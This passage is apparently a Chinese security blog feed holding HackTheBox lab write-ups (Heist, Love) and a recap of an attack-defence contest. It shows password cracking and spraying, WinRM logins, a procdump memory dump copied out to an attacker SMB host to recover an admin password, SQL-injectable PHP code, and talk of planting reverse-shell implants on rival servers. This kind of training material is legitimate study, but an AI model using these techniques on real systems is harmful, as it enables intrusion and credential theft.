href="#漏洞利用-4"></a> 漏洞利用</h2><p>访问<code>http://10.10.10.149/attachments/config.txt</code></p><ul><li>cisco的密码可以在线破解(<a href="https://www.ifm.net.nz/cookbooks/passwordcracker.html">https://www.ifm.net.nz/cookbooks/passwordcracker.html</a>)</li><li>md5直接john爆破</li></ul><p>得到一些账户</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rout3r:<span class="variable">$uperP</span>@ssword</span><br><span class="line">admin:Q4)sJu\Y8qz*A3?d</span><br><span class="line">secret:stealth1agent</span><br></pre></td></tr></table></figure><p>测试hazard的密码(由于未知原因，hydra不能爆破SMB)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.149 -u hazard -p stealth1agent</span><br><span class="line">        </span><br><span class="line">  Disk                                                    Permissions Comment</span><br><span class="line">  ----                                                    ----------- -------</span><br><span class="line">  ADMIN$                                              NO ACCESS Remote Admin</span><br><span class="line">  C$                                                  NO ACCESS Default share</span><br><span class="line">  IPC$                                                READ ONLY Remote IPC</span><br></pre></td></tr></table></figure><p>枚举域账户信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python lookupsid.py hazard:stealth1agent@heist</span><br><span class="line"></span><br><span class="line">500: SUPPORTDESK\Administrator (SidTypeUser)</span><br><span class="line">501: SUPPORTDESK\Guest (SidTypeUser)</span><br><span class="line">503: SUPPORTDESK\DefaultAccount (SidTypeUser)</span><br><span class="line">504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)</span><br><span class="line">513: SUPPORTDESK\None (SidTypeGroup)</span><br><span class="line">1008: SUPPORTDESK\Hazard (SidTypeUser)</span><br><span class="line">1009: SUPPORTDESK\support (SidTypeUser)</span><br><span class="line">1012: SUPPORTDESK\Chase (SidTypeUser)</span><br><span class="line">1013: SUPPORTDESK\Jason (SidTypeUser)</span><br></pre></td></tr></table></figure><p>字典</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line"></span><br><span class="line">hazard</span><br><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">rout3r</span><br><span class="line">admin</span><br><span class="line">secret</span><br><span class="line">support</span><br><span class="line">Chase</span><br><span class="line">------</span><br><span class="line">cat pass</span><br><span class="line"></span><br><span class="line"><span class="variable">$uperP</span>@ssword</span><br><span class="line">Q4)sJu\Y8qz*A3?d</span><br><span class="line">stealth1agent</span><br></pre></td></tr></table></figure><p>爆破winrm服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.149 -d heist -u user -p pass</span><br><span class="line"></span><br><span class="line">WINRM       10.10.10.149    5985   10.10.10.149     [+] heist\Chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)</span><br></pre></td></tr></table></figure><p>winrm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.149 -u chase -p <span class="string">&quot;Q4)sJu\Y8qz*A3?d&quot;</span></span><br><span class="line"><span class="built_in">type</span> c:\users\chase\desktop\user.txt</span><br><span class="line"></span><br><span class="line">a127daef77ab6d9d92008653295f59c4</span><br></pre></td></tr></table></figure><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><p>查看进程</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line"></span><br><span class="line">    378      28    25008      62440       1.16   6216   1 firefox</span><br><span class="line">    355      25    16444      38908       0.27   6564   1 firefox</span><br><span class="line">   1050      73   172600     248916      13.88   6732   1 firefox</span><br><span class="line">    347      19     9972      34476       0.23   6844   1 firefox</span><br><span class="line">    401      34    40728     101244       3.31   6956   1 firefox</span><br></pre></td></tr></table></figure><p>可以看看firefox进程内存</p><p>开启HTTP服务与SMB服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9998&amp;</span><br><span class="line">python smbserver.py Bufferfly . -smb2support -username Buffer -password fly&amp;</span><br></pre></td></tr></table></figure><p>上传procdump并回传firefox进程内存</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget -uri http://10.10.16.14:9998/procdump64.exe -outfile procdump64.exe</span><br><span class="line">./procdump64.exe -accepteula -ma 6216</span><br><span class="line">net use \\10.10.16.14\Bufferfly /u:Buffer fly</span><br><span class="line">copy firefox.exe_210706_221007.dmp \\10.10.16.14\Bufferfly\</span><br><span class="line">net use /d \\10.10.16.14\Bufferfly</span><br></pre></td></tr></table></figure><p>查找admin相关信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -a admin firefox.exe_210706_221007.dmp</span><br><span class="line"></span><br><span class="line">localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5&#125;x/re8]FBuZ</span><br></pre></td></tr></table></figure><p>wimrm登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.149 -u administrator -p <span class="string">&#x27;4dD!5&#125;x/re8]FBuZ&#x27;</span></span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">50dfa3c6bfd20e2e0d071b073d766897</span><br></pre></td></tr></table></figure><p>还是没想通为啥hydra爆不了smb，以后有机会再试试</p><hr /><p>EOF</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;HTB返场了几台Windows的靶机&lt;/li&gt;
&lt;li&gt;确定了暑假的实习&lt;/li&gt;
&lt;li&gt;考试周的考试安排得靠后&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;正巧&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="Windows" scheme="https://yoloyolo.top/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-SE_Semifinal</title>
    <link href="https://yoloyolo.top/2021/07/04/CISCN-SE-Semifinal/"/>
    <id>https://yoloyolo.top/2021/07/04/CISCN-SE-Semifinal/</id>
    <published>2021-07-04T20:21:31.000Z</published>
    <updated>2021-07-04T09:00:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>25/60 三等奖(<s>二等奖守门员</s>)</p><a id="more"></a><ul><li>人手不足（3/4）</li><li>第二天的比赛时间提前导致状态不佳</li><li>…</li></ul><p>由于各种各样的原因，拿到了这个名次，遗憾也不能说一点都没有<br />但也足够了</p><p>首先聊下这个比赛的得分机制</p><ul><li>被Getflag会被扣100分，由攻击队伍平摊</li><li>被Check会被扣100分，由服务正常的队伍平摊</li></ul><p>先不说DOS搅屎了，同时被Getflag和被Check的情况是要尽量避免的，实在看不到怎么被打的就删站拉倒<br />当然，能保证服务运行也是件好事，因为比赛中后期出现了一大半宕机的情况，即使被打了，只要保证服务的正常反而可以上分</p><p>其次，PWN机我们不会打也不会修，但是不妨碍我们拿别人的Payload打别人（pwntools重放流量就完事了）<br />由于自己的疏忽，没在第一时间注意到服务器上的流量备份，错失了几千分<br />另外，由于PWN的Getflag是给出一个sh来执行<code>cat /flag</code>，而不是自动执行<code>cat /flag</code>，所以完全可以留住这个sh，后面再继续Getflag（别人的思路，太骚了）<br />如果碰巧别人删掉了程序放弃运维，就可以双倍扣分</p><p>Web的就好说了，看看自己服务器上有哪些马，然后批量上马，然后从流量里面翻别人的Payload<br />由于没有做网络隔离（赛前nmap了下，能通其他队的服务器和选手机器），所以完全可以在别人的服务器上传一个Meterpreter的反弹Shell马<br />从防守方来讲，程序马的运行权限是www-data，运维的权限是ctf，所以完全可以自己写一个后门来获得www-data权限，然后就可以用system函数来kill掉程序马<br />这个思路同样可以用来运维其他的情况</p><p>这次比赛Ban了不死马<br />所以，理想化的AWD流程，其实还是应该按CTF的思路来</p><ul><li>A负责源码审计以及修复</li><li>B负责监管流量来查看服务器上的后门以及其他队伍的Payload</li><li>C负责脚本编写以及运维</li><li>D负责脚本编写真空期的手动提交flag以及其他工作（例如PWN题的sh保留）</li></ul><p>A挖到漏洞就让C写Getflag脚本，同时D可以手动Getflag<br />B看到Payload就可以让A进行修复，并让C编写Getflag脚本，同时D可以手动Getflag</p><p>学到了很多，希望以后能用得上这些经验</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;25/60 三等奖(&lt;s&gt;二等奖守门员&lt;/s&gt;)&lt;/p&gt;</summary>
    
    
    
    <category term="Talk" scheme="https://yoloyolo.top/categories/Talk/"/>
    
    
    <category term="AWD" scheme="https://yoloyolo.top/tags/AWD/"/>
    
    <category term="CISCN" scheme="https://yoloyolo.top/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>HTB_Windows_Set_0</title>
    <link href="https://yoloyolo.top/2021/06/09/HTB-Windows-Set-0/"/>
    <id>https://yoloyolo.top/2021/06/09/HTB-Windows-Set-0/</id>
    <published>2021-06-09T21:20:32.000Z</published>
    <updated>2021-07-04T09:26:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>The more knowledge you drink, the more thirsty you are.</p><a id="more"></a><h1 id="love"><a class="markdownIt-Anchor" href="#love"></a> love</h1><h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.87s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/9%Time=60C04557%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed</span></span><br><span class="line"><span class="string">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,4</span><br><span class="line">SF:9,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x2</span></span><br><span class="line"><span class="string">SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(HTTPOptions,49,<span class="string">&quot;E</span></span><br><span class="line"><span class="string">SF:\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\</span></span><br><span class="line"><span class="string">SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(RPCCheck,49,<span class="string">&quot;E\0\0\x0</span></span><br><span class="line"><span class="string">SF:1\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20conn</span></span><br><span class="line"><span class="string">SF:ect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(DNSStatusRequestTCP,49,<span class="string">&quot;E\0\</span></span><br><span class="line"><span class="string">SF:0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20</span></span><br><span class="line"><span class="string">SF:connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(TerminalServerCookie,49,</span><br><span class="line">SF:<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20t</span></span><br><span class="line"><span class="string">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(Kerberos,49,<span class="string">&quot;E\0\0\</span></span><br><span class="line"><span class="string">SF:x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20co</span></span><br><span class="line"><span class="string">SF:nnect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(X11Probe,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(FourOhFourRequest,49,<span class="string">&quot;E\0\0\x01\x</span></span><br><span class="line"><span class="string">SF:ffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect</span></span><br><span class="line"><span class="string">SF:\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPSearchReq,49,<span class="string">&quot;E\0\0\x01\xff</span></span><br><span class="line"><span class="string">SF:j\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x</span></span><br><span class="line"><span class="string">SF:20to\x20this\x20MariaDB\x20server&quot;</span>)%r(LDAPBindReq,49,<span class="string">&quot;E\0\0\x01\xffj\x0</span></span><br><span class="line"><span class="string">SF:4Host\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to</span></span><br><span class="line"><span class="string">SF:\x20this\x20MariaDB\x20server&quot;</span>)%r(SIPOptions,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host</span></span><br><span class="line"><span class="string">SF:\x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t</span></span><br><span class="line"><span class="string">SF:his\x20MariaDB\x20server&quot;</span>)%r(TerminalServer,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\</span></span><br><span class="line"><span class="string">SF:x20&#x27;10\.10\.16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20th</span></span><br><span class="line"><span class="string">SF:is\x20MariaDB\x20server&quot;</span>)%r(NCP,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.</span></span><br><span class="line"><span class="string">SF:16\.2&#x27;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaD</span></span><br><span class="line"><span class="string">SF:B\x20server&quot;</span>)%r(JavaRMI,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.2&#x27;\x</span></span><br><span class="line"><span class="string">SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser</span></span><br><span class="line"><span class="string">SF:ver&quot;</span>);</span><br><span class="line">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 443 10.10.10.239</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.239</span><br><span class="line">Host is up (0.75s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)</span><br><span class="line">|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=<span class="keyword">in</span></span><br><span class="line">| Not valid before: 2021-01-18T14:00:16</span><br><span class="line">|_Not valid after:  2022-01-18T14:00:16</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Hosts: www.example.com, www.love.htb</span><br></pre></td></tr></table></figure><p>这里需要对SSL端口进行更加详细的扫描才能得到域名<code>staging.love.htb</code><br />不使用域名访问443端口则会被403<br />5000端口则是直接403</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>用域名访问443端口可以看到一个LFI漏洞<br />file协议读取即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\login.php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$voter</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;voter&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM voters WHERE voters_id = &#x27;<span class="subst">$voter</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find voter with the ID&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;voter&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input voter credentials first&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\admin\login.php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;includes/conn.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Cannot find account with the username&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$query</span>-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="variable">$password</span>, <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Incorrect password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>] = <span class="string">&#x27;Input admin credentials first&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;location: index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#C:\xampp\htdocs\omrs\admin\includes\conn.php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;votesystem&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显地存在SQL注入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 